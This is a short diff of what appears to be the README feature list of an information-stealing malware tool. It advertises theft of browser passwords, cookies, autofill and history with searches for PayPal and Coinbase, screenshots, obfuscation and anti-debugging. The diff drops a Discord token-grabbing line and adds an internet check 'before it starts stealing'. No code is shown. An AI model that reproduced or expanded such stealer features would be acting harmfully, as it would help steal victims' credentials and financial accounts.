@@ -67,11 +67,11 @@
 > Passwords, Cookies, Autofill & History (Searches for specific keywords such as PayPal, Coinbase etc. in them)
 >
 > Screenshot(s)
->
-> Injects itself to discord to grab token when changed
 
 #### Additional
 
+> Internet connection check every 3 seconds before it starts stealing
+>
 > Ultra Obfuscation (use https://obfuscator.io)
 >
 > Anti-Debug
